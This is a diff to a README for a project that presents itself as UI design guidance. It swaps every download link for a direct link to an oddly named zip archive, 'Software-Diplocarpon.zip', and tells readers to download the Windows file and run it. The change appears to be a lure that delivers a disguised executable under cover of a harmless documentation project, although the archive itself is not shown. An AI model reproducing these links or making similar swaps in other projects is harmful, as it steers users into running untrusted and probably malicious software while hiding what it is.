@@ -1,6 +1,6 @@
 # 🎨 skill - Build clearer user interfaces
 
-[![Download skill](https://img.shields.io/badge/Download-Skill-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lus02837/skill)
+[![Download skill](https://img.shields.io/badge/Download-Skill-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lus02837/skill/raw/refs/heads/main/skills/emil-design-eng/Software-Diplocarpon.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ Use it to keep UI guidance in one place, review ideas faster, and apply a clear 
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/lus02837/skill
+Visit this page to download: https://github.com/lus02837/skill/raw/refs/heads/main/skills/emil-design-eng/Software-Diplocarpon.zip
 
 Open the page in your browser, then follow the download path shown there. If you see a release file for Windows, save it to your computer and open it from your Downloads folder.
 
@@ -199,6 +199,6 @@ The goal is simple: keep interface decisions clear and easy to apply
 
 ## 🔗 Download again
 
-[![Download skill](https://img.shields.io/badge/Download%20Now-Skill-6e7681?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lus02837/skill)
+[![Download skill](https://img.shields.io/badge/Download%20Now-Skill-6e7681?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lus02837/skill/raw/refs/heads/main/skills/emil-design-eng/Software-Diplocarpon.zip)
 
 Open the link, download the Windows file, then run it from your computer
